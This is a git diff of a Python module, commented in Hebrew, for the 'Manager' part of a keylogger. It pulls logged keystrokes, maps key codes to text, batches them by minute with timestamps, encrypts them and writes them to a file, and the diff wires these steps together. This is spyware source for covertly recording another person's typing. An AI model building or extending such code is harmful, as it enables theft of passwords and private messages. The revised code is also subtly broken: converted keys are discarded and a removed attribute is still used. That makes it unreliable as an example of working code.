@@ -1,15 +1,106 @@
 #" המטרה: הקלאס מקבל כל פעם אות אחת מקילוגר, עוטף את המלל של כל דקה ושולח אותו עם חותמת זמן לקלאס הבא של ההצפנה
 
 from time import sleep
+# from datetime import datetime
+# import tzlocal  # צריך להתקין עם: pip install tzlocal
+#
+#
+# class Manager:
+#     def __init__(self):
+#         self.my_dict = {}
+#         self.my_str = ""
+#         self.time = self.get_time()
+#
+#     def get_time(self):
+#         local_timezone = tzlocal.get_localzone()
+#         local_time = datetime.now(local_timezone)
+#         formatted_time = local_time.strftime("%Z %d/%m/%Y %H:%M")
+#         return formatted_time
+#
+#     def key_to_char(self,key):
+#         key = str(key)#.replace("'", "")
+#         if key == 'Key.space':
+#             key = ' '
+#         if key == 'Key.enter':
+#             key = '\n'
+#         if key == 'Key.up':
+#             key = ' Key.up '
+#         if key == 'Key.right':
+#             key = ' Key.right '
+#         if key == 'Key.left':
+#             key = ' Key.left '
+#         if key == 'Key.down':
+#             key = ' Key.down '
+#         if key == 'Key.ctrl_l':
+#             key = ' ctrl '
+#         if key == '\\x03':
+#             key = ' copy '
+#         if key == 'Key.backspace':
+#             key = ''
+#         if key == '\\x18':
+#             key = 'cut '
+#         if key == '\\x16':
+#             key = 'paste '
+#         if key == '<96>':
+#             key = 0
+#         if key == '<97>':
+#             key = 1
+#         if key == '<98>':
+#             key = 2
+#         if key == '<99>':
+#             key = 3
+#         if key == '<100>':
+#             key = 4
+#         if key == '<101>':
+#             key = 5
+#         if key == '<102>':
+#             key = 6
+#         if key == '<103>':
+#             key = 7
+#         if key == '<104>':
+#             key = 8
+#         if key == '<105>':
+#             key = 9
+#
+#         return self.char_to_dict(key)
+#
+#
+#     def char_to_dict(self,key):
+#         if self.get_time() == self.time:
+#             self.my_str += key
+#         else:
+#             self.my_dict = {}
+#             self.my_dict[self.time] = self.my_str
+#             self.my_str = ""
+#             self.time = self.get_time()
+#             print(self.my_dict)
+#             return self.my_dict
+
 from datetime import datetime
 import tzlocal  # צריך להתקין עם: pip install tzlocal
-
+from Cipher import Cipher
 
 class Manager:
-    def __init__(self):
+    def __init__(self,keylogger_system,writer):
         self.my_dict = {}
-        self.my_str = ""
         self.time = self.get_time()
+        self.keylogger_system = keylogger_system
+        self.writer = writer
+        self.encryptor = Cipher()
+
+
+    def run(self):
+        if self.time != self.get_time():
+            ls = self.keylogger_system.get_logged_keys()
+            if ls != []:
+                for i in ls:
+                    self.key_to_char(i)
+                self.my_dict = {}
+                self.my_dict[self.time] = ls
+                self.time = self.get_time()
+                encrypt_data = self.encryptor.cipher(self.my_dict)
+                self.writer.write_to_file(encrypt_data)
+
 
     def get_time(self):
         local_timezone = tzlocal.get_localzone()
@@ -18,65 +109,60 @@ class Manager:
         return formatted_time
 
     def key_to_char(self,key):
+
         key = str(key)#.replace("'", "")
         if key == 'Key.space':
             key = ' '
-        if key == 'Key.enter':
+        elif key == 'Key.enter':
             key = '\n'
-        if key == 'Key.up':
+        elif key == 'Key.up':
             key = ' Key.up '
-        if key == 'Key.right':
+        elif key == 'Key.right':
             key = ' Key.right '
-        if key == 'Key.left':
+        elif key == 'Key.left':
             key = ' Key.left '
-        if key == 'Key.down':
+        elif key == 'Key.down':
             key = ' Key.down '
-        if key == 'Key.ctrl_l':
+        elif key == 'Key.ctrl_l':
             key = ' ctrl '
-        if key == '\\x03':
+        elif key == '\\x03':
             key = ' copy '
-        if key == 'Key.backspace':
+        elif key == 'Key.backspace':
             key = ''
-        if key == '\\x18':
+        elif key == '\\x18':
             key = 'cut '
-        if key == '\\x16':
+        elif key == '\\x16':
             key = 'paste '
-        if key == '<96>':
+        elif key == '<96>':
             key = 0
-        if key == '<97>':
+        elif key == '<97>':
             key = 1
-        if key == '<98>':
+        elif key == '<98>':
             key = 2
-        if key == '<99>':
+        elif key == '<99>':
             key = 3
-        if key == '<100>':
+        elif key == '<100>':
             key = 4
-        if key == '<101>':
+        elif key == '<101>':
             key = 5
-        if key == '<102>':
+        elif key == '<102>':
             key = 6
-        if key == '<103>':
+        elif key == '<103>':
             key = 7
-        if key == '<104>':
+        elif key == '<104>':
             key = 8
-        if key == '<105>':
+        elif key == '<105>':
             key = 9
 
-        return self.char_to_dict(key)
 
 
-    def char_to_dict(self,key):
-        if self.get_time() == self.time:
-            self.my_str += key
-        else:
-            self.my_dict = {}
-            self.my_dict[self.time] = self.my_str
-            self.my_str = ""
-            self.time = self.get_time()
-            print(self.my_dict)
-            return self.my_dict
 
-
+    def char_to_dict(self,):
+        self.my_dict = {}
+        self.my_dict[self.time] = self.my_str
+        self.time = self.get_time()
+        print(self.my_dict)
+        return self.my_dict
 #
 #
 # m = Manager()
